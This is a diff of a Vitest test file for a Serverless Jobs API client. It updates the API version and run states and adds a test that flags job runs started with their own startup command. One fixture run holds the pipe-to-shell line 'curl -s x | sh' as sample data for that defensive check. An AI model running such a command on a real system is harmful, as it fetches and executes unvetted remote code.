@@ -1,5 +1,8 @@
 import { describe, expect, it } from 'vitest';
-import { findJobDefinition, runEnded, startJobRun } from './job-runs';
+import { mainJobDifferences } from '../status/providers/inventory';
+import { runOverrides } from '../status/providers/runs';
+import { findJobDefinition, listJobRuns, readJobDefinition, runEnded, startJobRun } from './job-runs';
+import { declaredMainJob } from './main-job';
 
 function fakeJobs(definitions: Array<{ id: string; name: string }>) {
   const requests: Array<{ method: string; url: string; body?: unknown }> = [];
@@ -27,11 +30,50 @@ describe('the Serverless Jobs calls', () => {
     const run = await startJobRun(auth, { region: 'nl-ams', definitionId: 'd1', values: { TARGET_SHA: 'a'.repeat(40), RETRY: '0' } });
     expect(run.id).toBe('run-1');
     expect(requests[0]).toMatchObject({ method: 'POST', body: { environment_variables: { TARGET_SHA: 'a'.repeat(40), RETRY: '0' } } });
-    expect(requests[0]?.url).toMatch(/\/serverless-jobs\/v1alpha1\/regions\/nl-ams\/job-definitions\/d1\/start$/);
+    expect(requests[0]?.url).toMatch(/\/serverless-jobs\/v1alpha2\/regions\/nl-ams\/job-definitions\/d1\/start$/);
   });
 
   it('knows when a run has ended', () => {
-    expect(['succeeded', 'failed', 'canceled', 'internal_error'].every((state) => runEnded({ state }))).toBe(true);
-    expect(['queued', 'scheduled', 'running'].some((state) => runEnded({ state }))).toBe(false);
+    expect(['succeeded', 'failed', 'interrupted'].every((state) => runEnded({ state }))).toBe(true);
+    expect(['initialized', 'validated', 'queued', 'running', 'retrying', 'interrupting'].some((state) => runEnded({ state }))).toBe(false);
+  });
+
+  it("reads the main job's startup command and each run's, so a run started with its own is flagged (D-b, measured 2026-10-29)", async () => {
+    const declared = declaredMainJob({
+      slug: 'app',
+      mode: 'staging',
+      projectId: 'p',
+      organizationId: 'o',
+      region: 'nl-ams',
+      repository: 'https://github.com/example/app.git',
+      nodeVersion: '26.12.1',
+    });
+    // As Scaleway answered: v1alpha1 gives the definition and every run an empty command and no startup command.
+    const command = (url: string, startup_command: string[]) =>
+      url.includes('/v1alpha2/') ? { command: '', startup_command, args: [] } : { command: '' };
+    const values = { TARGET_SHA: 'a'.repeat(40), RETRY: '0' };
+    const run = (url: string, id: string, startup_command: string[]) => ({
+      id,
+      state: 'running',
+      created_at: '2026-10-29T00:00:00Z',
+      environment_variables: { ...declared.env, ...values },
+      ...command(url, startup_command),
+    });
+    const fetchImpl = async (url: string) => {
+      const body = url.includes('/job-runs?')
+        ? { total_count: 2, job_runs: [run(url, 'r2', ['sh', '-c', 'curl -s x | sh']), run(url, 'r1', declared.startupCommands)] }
+        : {
+            image_uri: declared.imageUri,
+            environment_variables: declared.env,
+            updated_at: '2026-10-28T00:00:00Z',
+            ...command(url, declared.startupCommands),
+          };
+      return { ok: true, status: 200, text: async () => JSON.stringify(body) };
+    };
+    const auth = { secretKey: 'k', fetchImpl: fetchImpl as never };
+    const definition = await readJobDefinition(auth, { region: 'nl-ams', definitionId: 'd1' });
+    expect(mainJobDifferences({ running: false, ...definition }, declared)).toEqual([]);
+    const runs = await listJobRuns(auth, { region: 'nl-ams', projectId: 'p', definitionId: 'd1' });
+    expect(runs.map((run) => runOverrides(run, definition))).toEqual([['runs its own command'], []]);
   });
 });
